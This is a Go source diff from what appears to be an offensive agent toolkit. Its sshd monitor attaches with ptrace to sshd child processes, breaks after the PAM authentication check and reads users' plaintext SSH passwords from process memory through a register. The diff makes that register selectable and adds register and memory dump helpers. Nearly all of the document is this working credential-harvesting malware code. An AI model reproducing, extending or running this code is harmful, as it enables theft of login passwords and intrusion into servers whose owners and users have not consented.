@@ -5,6 +5,7 @@ package agent
 
 import (
 	"bytes"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"runtime"
@@ -22,7 +23,7 @@ var (
 	traced_pids_mut = &sync.RWMutex{}
 )
 
-func sshd_monitor(logStream chan string, code_pattern []byte) (err error) {
+func sshd_monitor(logStream chan string, code_pattern []byte, reg_name string) (err error) {
 	alive, sshd_procs := util.IsProcAlive("sshd")
 	if !alive {
 		util.LogStreamPrintf(logStream, "sshd_monitor (%d): sshd process not found, aborting", unix.Getpid())
@@ -45,7 +46,7 @@ func sshd_monitor(logStream chan string, code_pattern []byte) (err error) {
 				if err == nil {
 					traced_pids_mut.RLock()
 					if !traced_pids[child_pid] {
-						go sshd_harvester(child_pid, logStream, code_pattern)
+						go sshd_harvester(child_pid, logStream, code_pattern, reg_name)
 					}
 					traced_pids_mut.RUnlock()
 				}
@@ -62,7 +63,7 @@ func sshd_monitor(logStream chan string, code_pattern []byte) (err error) {
 	}
 }
 
-func sshd_harvester(pid int, logStream chan string, code_pattern []byte) {
+func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_name string) {
 	// remember pid
 	traced_pids_mut.Lock()
 	traced_pids[pid] = true
@@ -173,7 +174,10 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte) {
 
 	// before breakpoint, what does the code look like
 	util.LogStreamPrintf(logStream, "Before setting the breakpoint, what does the code look like?")
-	dump_code(pid, 0, logStream)
+	regs := dump_regs(pid, logStream)
+	if regs != nil {
+		dump_code(pid, uintptr(regs.Rip), logStream)
+	}
 
 	// write breakpoint
 	code_with_trap := make([]byte, 8)
@@ -215,37 +219,21 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte) {
 
 handler:
 	success := false
-	// where are we at
-	util.LogStreamPrintf(logStream, "Dumping code at RIP after hitting breakpoint")
-	dump_code(pid, 0, logStream)
-
 	// read registers on break
-	regs := new(unix.PtraceRegs)
+	regs = new(unix.PtraceRegs)
 	err = unix.PtraceGetRegs(pid, regs)
 	if err != nil {
 		util.LogStreamPrintf(logStream, "get regs: %v", err)
 		return
 	}
-	password_reg := regs.Rbp
 	pam_ret := regs.Rax
+	// where are we at
+	util.LogStreamPrintf(logStream, "Dumping code at RIP after hitting breakpoint")
+	dump_code(pid, uintptr(regs.Rip), logStream)
 
-	// read password from RBP
-	buf := make([]byte, 1)
-	var password_bytes []byte
-	util.LogStreamPrintf(logStream, "Extracting password from RBP (0x%x)", password_reg)
-	for {
-		_, err := unix.PtracePeekText(pid, uintptr(password_reg), buf)
-		if err != nil {
-			util.LogStreamPrintf(logStream, "reading password from RBP (0x%x): %v", password_reg, err)
-			return
-		}
-		// until NULL is reached
-		if buf[0] == 0 {
-			break
-		}
-		password_bytes = append(password_bytes, buf...)
-		password_reg++ // read next byte
-	}
+	// read password from given register name
+	password_bytes := read_reg_val(pid, reg_name, logStream)
+	util.LogStreamPrintf(logStream, "Extracting password from %s", reg_name)
 	password := string(password_bytes)
 	if pam_ret == 0 {
 		util.LogStreamPrintf(logStream, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
@@ -267,6 +255,8 @@ handler:
 		util.LogStreamPrintf(logStream, "set regs back: %v", err)
 		return
 	}
+	regs = dump_regs(pid, logStream)
+	dump_code(pid, uintptr(regs.Rip), logStream)
 	// single step to execute original code
 	err = unix.PtraceSingleStep(pid)
 	if err != nil {
@@ -320,26 +310,78 @@ handler:
 	}
 }
 
-func dump_code(pid int, addr uintptr, log_stream chan string) {
+func dump_regs(pid int, log_stream chan string) (regs *unix.PtraceRegs) {
+	// dump reg values
+	rax := read_reg_val(pid, "RAX", log_stream)
+	rdi := read_reg_val(pid, "RDI", log_stream)
+	rsi := read_reg_val(pid, "RSI", log_stream)
+	rdx := read_reg_val(pid, "RDX", log_stream)
+	rcx := read_reg_val(pid, "RCX", log_stream)
+	r8 := read_reg_val(pid, "R8", log_stream)
+	r9 := read_reg_val(pid, "R9", log_stream)
+	rbp := read_reg_val(pid, "RBP", log_stream)
+	rsp := read_reg_val(pid, "RSP", log_stream)
+	util.LogStreamPrintf(log_stream, "RAX=%s, RDI=%s, RSI=%s, RDX=%s, RCX=%s, R8=%s, R9=%s, RBP=%s, RSP=%s", rax, rdi, rsi, rdx, rcx, r8, r9, rbp, rsp)
+
+	return
+}
+
+// read register value, return printable text or hex string
+func read_reg_val(pid int, reg_name string, log_stream chan string) (val []byte) {
 	regs := new(unix.PtraceRegs)
 	err := unix.PtraceGetRegs(pid, regs)
 	if err != nil {
 		util.LogStreamPrintf(log_stream, "dump code for %d failed: %v", pid, err)
 		return
 	}
-	if addr == 0 {
-		addr = uintptr(regs.Rip)
-		util.LogStreamPrintf(log_stream, "Dumping code at RIP (0x%x)", addr)
+	switch reg_name {
+	case "RAX":
+		val = peek_text(pid, uintptr(regs.Rax), log_stream)
+	case "RDI":
+		val = peek_text(pid, uintptr(regs.Rdi), log_stream)
+	case "RSI":
+		val = peek_text(pid, uintptr(regs.Rsi), log_stream)
+	case "RDX":
+		val = peek_text(pid, uintptr(regs.Rdx), log_stream)
+	case "RCX":
+		val = peek_text(pid, uintptr(regs.Rcx), log_stream)
+	case "R8":
+		val = peek_text(pid, uintptr(regs.R8), log_stream)
+	case "R9":
+		val = peek_text(pid, uintptr(regs.R9), log_stream)
+	case "RBP":
+		val = peek_text(pid, uintptr(regs.Rbp), log_stream)
+	case "RSP":
+		val = peek_text(pid, uintptr(regs.Rsp), log_stream)
 	}
-	util.LogStreamPrintf(log_stream, "Dumping registers: RIP=0x%x, RBP=0x%x, RAX=0x%x, RDI=0x%x, RSI=0x%x, RDX=0x%x, RCX=0x%x, R8=0x%x, R9=0x%x",
-		regs.Rip, regs.Rbp, regs.Rax, regs.Rdi, regs.Rsi, regs.Rdx, regs.Rcx, regs.R8, regs.R9)
-	code_bytes := make([]byte, 128)
-	_, err = unix.PtracePeekText(pid, addr, code_bytes)
-	if err != nil {
-		util.LogStreamPrintf(log_stream, "dump code for %d failed: PEEKTEXT: %v", pid, err)
+	return
+}
+
+// read memory at addr and check if it's printable, 24 bytes at most
+func peek_text(pid int, addr uintptr, log_stream chan string) (read_bytes []byte) {
+	if addr == 0 {
+		util.LogStreamPrintf(log_stream, "Invalid address 0x%x", addr)
 		return
 	}
-	util.LogStreamPrintf(log_stream, "Dumped code at 0x%x: 0x%x", addr, code_bytes)
+	read_bytes = make([]byte, 24)
+	_, err := unix.PtracePeekText(pid, addr, read_bytes)
+	if err != nil {
+		util.LogStreamPrintf(log_stream, "PEEKTEXT: %v", err)
+		return
+	}
+	if util.AreBytesPrintable(read_bytes) {
+		return
+	}
+	res_str := hex.EncodeToString(read_bytes)
+	return []byte(res_str)
+}
+
+func dump_code(pid int, addr uintptr, log_stream chan string) {
+	code_bytes := peek_text(pid, addr, log_stream)
+	if len(code_bytes) == 0 {
+		return
+	}
+	util.LogStreamPrintf(log_stream, "Code at 0x%x: %x", addr, code_bytes)
 }
 
 func get_tracer_pid(pid int, log_stream chan string) (tracer_pid int) {
